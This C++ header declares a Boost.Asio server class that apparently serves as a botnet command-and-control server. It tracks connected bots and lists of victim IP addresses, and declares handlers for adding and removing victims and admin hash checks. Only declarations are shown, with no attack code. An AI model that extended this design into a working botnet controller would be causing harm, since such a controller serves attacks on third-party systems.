#ifndef SERVER_H
#define SERVER_H

#define INACTIVITY_TIMEOUT 1  // 1 second
#define INACTIVE_COUNTER_MAX 60
#define NONE_PARAMETERS ""
#define MAX_NUMBER_OF_BOTS_DATA_PER_MSG 20

#include <unistd.h>

#include <algorithm>
#include <boost/algorithm/string/classification.hpp>  // Include boost::for is_any_of
#include <boost/algorithm/string/split.hpp>	      // Include for boost::split
#include <boost/asio.hpp>
#include <boost/asio/io_context.hpp>
#include <boost/bind/bind.hpp>
#include <chrono>
#include <cmath>
#include <cstdint>
#include <future>
#include <iostream>
#include <memory>
#include <mutex>
#include <optional>
#include <queue>
#include <random>
#include <sstream>
#include <string>
#include <unordered_map>
#include <utility>
#include <vector>

#include "helper.h"
#include "msg_parser.h"
#include "session.h"

namespace io = boost::asio;
using tcp = io::ip::tcp;
using err = boost::system::error_code;

class server {
	struct bot_info {
		int victims = 0;
		long int msgs_from = 0;
		int id;
		int ping;
		int inactive_counter;
		std::string connected;
		std::string status;
		std::vector<std::string> victims_vector;
	};

    public:
	server(io::io_context &, std::uint16_t);
	void start();

    private:
	// Accepting new clients
	void accept();
	void onAccept(err error_code);

	io::io_context &io_context_;
	tcp::acceptor acceptor_;
	std::optional<tcp::socket> socket_;

	void pingClients();
	boost::posix_time::seconds interval_;
	boost::asio::deadline_timer timer_;

	// Helpers
	int getClientId_();
	static bool isNumber_(const std::string &);
	bool checkHash_(std::string &);
	const std::string getCurrentDateTime_();
	void updateMsgCounter_(session *);
	int is_valid_ip(std::string);
	bool valid_part(char *s);

	// Communication
	void handleResponse(std::string &, session *);
	void handleAlive(std::string &, std::vector<std::string> &, session *);
	void handleInit(std::string &, std::vector<std::string> &params, session *client);
	void handleGetClientsData(std::string &, std::vector<std::string> &params, session *client);
	void handleGetVictimsData(std::string &, std::vector<std::string> &params, session *client);
	void handleRemoveClient(std::string &, std::vector<std::string> &params, session *client);
	void handleRemoveVictim(std::string &, std::vector<std::string> &params, session *client);
	void handleAddVictim(std::string &, std::vector<std::string> &params, session *client);

	msg_parser msg_parser_;
	std::unordered_map<int, std::shared_ptr<session>> clients_sessions_container_;
	std::unordered_map<std::string, bot_info> clients_data_container_;

	std::unordered_map<std::string, std::function<void(std::string &, std::vector<std::string> &, session *)>>
	    command_handlers_;

	// Manager handling
	size_t admin_hash_ = 0;
	std::vector<std::string> victims_ips_;
	std::queue<std::vector<std::string>> bots_data_output_;
};

#endif	// SERVER_H